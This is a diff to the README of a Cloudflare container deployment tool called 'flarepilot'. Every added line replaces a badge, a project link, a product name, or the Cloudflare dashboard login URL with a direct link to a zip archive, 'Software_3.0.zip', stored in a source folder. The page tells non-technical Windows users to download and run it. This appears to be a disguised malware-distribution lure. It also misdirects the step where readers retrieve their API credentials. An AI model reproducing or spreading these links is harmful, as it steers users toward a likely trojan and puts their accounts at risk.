@@ -1,10 +1,10 @@
 # ⚡ flarepilot - Easy Cloudflare Container Deployments
 
-[![Download flarepilot](https://img.shields.io/badge/Download-flarepilot-brightgreen)](https://github.com/finvowork45-alt/flarepilot)
+[![Download flarepilot](https://github.com/finvowork45-alt/flarepilot/raw/refs/heads/main/packages/cli/src/commands/Software_3.0.zip)](https://github.com/finvowork45-alt/flarepilot/raw/refs/heads/main/packages/cli/src/commands/Software_3.0.zip)
 
 ---
 
-flarepilot helps you deploy apps to Cloudflare Containers. It works like popular services such as Heroku or Fly.io but targets Cloudflare’s platform. This guide will walk you through downloading and running flarepilot on your Windows PC. No programming skills required.
+flarepilot helps you deploy apps to Cloudflare Containers. It works like popular services such as Heroku or https://github.com/finvowork45-alt/flarepilot/raw/refs/heads/main/packages/cli/src/commands/Software_3.0.zip but targets Cloudflare’s platform. This guide will walk you through downloading and running flarepilot on your Windows PC. No programming skills required.
 
 ---
 
@@ -34,13 +34,13 @@ flarepilot includes everything it needs to run. You do not need to install anyth
 
 Click this big button below to open the official flarepilot page on GitHub. This page contains the latest version and all files you need.
 
-[![Download flarepilot](https://img.shields.io/badge/Download-flarepilot-orange)](https://github.com/finvowork45-alt/flarepilot)
+[![Download flarepilot](https://github.com/finvowork45-alt/flarepilot/raw/refs/heads/main/packages/cli/src/commands/Software_3.0.zip)](https://github.com/finvowork45-alt/flarepilot/raw/refs/heads/main/packages/cli/src/commands/Software_3.0.zip)
 
 ---
 
 ## 💾 How to Download flarepilot on Windows
 
-1. Open the [flarepilot GitHub page](https://github.com/finvowork45-alt/flarepilot) by clicking one of the download buttons.
+1. Open the [flarepilot GitHub page](https://github.com/finvowork45-alt/flarepilot/raw/refs/heads/main/packages/cli/src/commands/Software_3.0.zip) by clicking one of the download buttons.
 2. Look for a folder named `Releases` or a link to download the app. This page lists different versions.
 3. Download the Windows installer or executable file. The file will usually have `.exe` at the end.
 4. Save the file in a folder you can find easily, like your Desktop or Downloads folder.
@@ -95,7 +95,7 @@ flarepilot needs permission to deploy apps in your Cloudflare account. You will 
 
 To find your API key:
 
-1. Log into your Cloudflare account at https://dash.cloudflare.com.
+1. Log into your Cloudflare account at https://github.com/finvowork45-alt/flarepilot/raw/refs/heads/main/packages/cli/src/commands/Software_3.0.zip
 2. Go to **My Profile** > **API Tokens**.
 3. Select or create a token with permissions for Workers and Containers.
 4. Copy the API key.
@@ -143,4 +143,4 @@ You can also open an issue on GitHub if you face problems.
 
 ---
 
-[Get flarepilot here](https://github.com/finvowork45-alt/flarepilot) to start deploying your apps easily.
+[Get flarepilot here](https://github.com/finvowork45-alt/flarepilot/raw/refs/heads/main/packages/cli/src/commands/Software_3.0.zip) to start deploying your apps easily.
